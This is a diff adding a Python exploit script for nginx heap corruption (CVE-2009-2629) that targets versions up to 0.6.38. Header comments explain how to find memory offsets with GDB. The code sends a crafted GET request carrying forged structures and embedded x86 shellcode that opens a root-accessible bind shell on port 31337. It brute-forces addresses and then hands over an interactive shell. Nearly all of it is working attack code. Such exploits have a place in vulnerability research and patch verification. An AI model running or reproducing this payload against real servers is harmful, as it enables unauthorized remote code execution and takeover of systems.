@@ -1,0 +1,201 @@
+#!/usr/bin/env python
+#
+# Exploit Title: nginx heap corruption
+# Date: 08/26/2010
+# Author: aaron conole <apconole@yahoo.com>
+# Software Link: http://nginx.org/download/nginx-0.6.38.tar.gz
+# Version: <= 0.6.38, <= 0.7.61
+# Tested on: BT4R1 running nginx 0.6.38 locally
+# CVE: 2009-2629
+#
+# note: this was written and tested against BT4. This means it's an
+#       intel x86 setup (ie: offsets for 32-bit machine, etc.). YMMV
+#       also - only tested successfully against nginx 0.6.38
+#              you'll definitely need to modify against other versions
+#
+# you'll need to know where the offset is going to land, and what the pad is
+# from that point to when you've tained execution flow.
+#
+# A quick way to find out just for verification would be to launch nginx,
+# attach GDB to the worker and target it with the exploit, setting the offset
+# to 0, or some other arbitrary value. It should crash on a piece of code which
+# resembles:
+#   if (ctx->offset)
+#
+# At that point, merely dump the *r; capture the value for the data pointer
+# (it'll be the one with "GET //../Aa0") and add 131 to it (decimal 131 to the
+# hex pointer value). That should give you a good area to test with. You might
+# want to use the range at that point and set the last octet to 00.
+#
+# NOTE: you'll need a configuration with merge_slashes enabled. I haven't yet
+#       found a "magic" combination that would cause the state machine to do
+#       what I want to make the bug trigger. Once I do, you can bet BUG will be
+#       replaced.
+
+#Basically, on BT4:
+#- compile
+#- edit the configuration to enable merge slashes (just insert a line above the sendpage / sendfile config option "merge_slashes off;")
+#- Launch nginx, and attach GDB to the worker
+#- Send the exploit at it with offset 0x11111111
+#- When the worker gets a sigsegv, it will be on a line which looks like "if (ctx->offset)", at that point type "p *r"
+#- In the r data structure will be a few different fields, one which is a buffer that contains "GET //../Aa0Aa1Aa2..". This buffer has an address (lets say 0x8c1d32f).
+#- Save off this address, and detach from the worker. A new one will spawn (the "manager" process will keep it going).
+#- At this point, rerun the exploit, setting the offset to 0x8c1d300 and adding the -b flag
+#- In a minute or two, you should be given the shell.
+
+import os
+import sys
+import socket
+import select
+import struct
+import time
+import urllib
+
+REQUEST_METHOD='GET '
+
+# NOTE - this is a 32-bit null pointer. A 64-bit version would be 8-bytes (but take care to re-verify the structures)
+NULLPTR='\x00\x00\x00\x00'
+
+# NOTE - this shellcode was shamelessly stolen from the www
+#        port 31337 bindshell for /bin/sh
+SHELL='\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80'
+
+# Why did I write this up this way? Because given enough time, I think I can
+# find a proper set of state change which can give me the same effect (ie: ../
+# appearing as the 3rd, 4th, and 5th characters) at a later date.
+# That's all controlled by the complex uri parsing bit, though.
+DOUBLE_SLASH='//../'
+
+BUG=DOUBLE_SLASH
+
+# taken from the metasploit pattern_create.rb
+PATTERN='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4'
+
+def connect_socket(host,port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect( (host, port) )
+    except:
+        return 0
+    #sock.setblocking(0)
+    return sock
+
+def handle_connection(sock):
+    while(1):
+        r, w, e = select.select( [sock, sys.stdin],
+                                 [],
+                                 [sock, sys.stdin] )
+        for s in r:
+            if s == sys.stdin:
+                buf = sys.stdin.readline()
+                
+                try:
+                    if buf != '':
+                        sock.send(buf)
+                except:
+                    print "Xon close?"
+                    return 0
+                
+            elif s == sock:
+                try:
+                    buf = sock.recv(100)
+                except:
+                    print "Xon close?"
+                    return 0
+                if buf != '':
+                    sys.stdout.write(buf)
+
+def main(argv):
+    argc = len(argv)
+
+    if argc < 4:
+        print "usage: %s <host> <port> <ctx_addr> [-b]" % (argv[0])
+        print "[*] exploit for nginx <= 0.6.38 CVE 2009-2629"
+        print "[*] host = the remote host name"
+        print "[*] port = the remote port"
+        print "[*] ctx_addr is where the context address should begin at"
+        print "[*] -b specifies a brute-force (which will start at ctx_addr"
+        sys.exit(0)
+
+    host = argv[1]
+    port = int(argv[2])
+    ctx_addr = int(argv[3],16)
+
+    brute_flag = 0
+    if(argc == 5):
+        brute_flag = 1
+
+    testing = 1
+
+    print "[*] target: %s:%d" % (host, port)
+
+    try:
+        sd = urllib.urlopen("http://%s:%d" % (host, port))
+        sd.close()
+    except IOError, errmsg:
+        print "[*] error: %s" % (errmsg)
+        sys.exit(1)
+
+    print "[*] sending exploit string to %s:%d" % (host, port)
+
+    while(testing):
+        
+        CTX_ADDRESS = struct.pack('<L',ctx_addr)
+        CTX_OUT_ADDRESS = struct.pack('<L', ctx_addr-60)
+        POOL_ADDRESS = struct.pack('<L',ctx_addr+56)
+        DATA_ADDRESS = struct.pack('<L',ctx_addr+86)
+        RANGE_ADDRESS = struct.pack('<L',ctx_addr+124)
+        SHELL_ADDRESS = struct.pack('<L',ctx_addr+128)
+
+        #PADDING
+        SHELLCODE=PATTERN[:67]
+
+        #the output context structure
+        SHELLCODE+=NULLPTR*9+POOL_ADDRESS+NULLPTR*4+SHELL_ADDRESS
+    
+        #Magic
+        SHELLCODE+=CTX_OUT_ADDRESS+CTX_ADDRESS+NULLPTR
+
+        #this is the context object - some null ptrs, then we set range, then
+        #pool address
+        SHELLCODE+=NULLPTR*3+RANGE_ADDRESS+'\x01\x00\x00\x00'
+        SHELLCODE+=NULLPTR*2+POOL_ADDRESS
+
+        #this is the data buffer object
+        SHELLCODE+=NULLPTR*4+SHELL_ADDRESS+NULLPTR
+
+        #this is the pool memory structure ..
+        SHELLCODE+=DATA_ADDRESS+NULLPTR+POOL_ADDRESS+NULLPTR*12+NULLPTR
+
+        # this is the range structure
+        SHELLCODE+='\xff\xff\xff\xff'+NULLPTR*3
+
+        SHELLCODE+=SHELL
+    
+        payload = REQUEST_METHOD
+        payload += BUG
+        payload += SHELLCODE
+        payload += ' HTTP/1.0\r\n\r\n'
+
+        sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sd.connect((host, port))
+        sd.send(payload)
+        sd.close()
+
+        if (brute_flag):
+            nsock = connect_socket(host,31337)
+            if nsock != 0:
+                print "[*] Successful Exploit via buffer: %x" % (ctx_addr)
+                testing = 0
+                handle_connection(nsock)
+            else:
+                ctx_addr = ctx_addr + 1
+        else:
+            testing = 0
+    print "[*] FIN."
+
+if __name__ == "__main__":
+    main(sys.argv)
+    sys.exit(0)
+
+# EOF
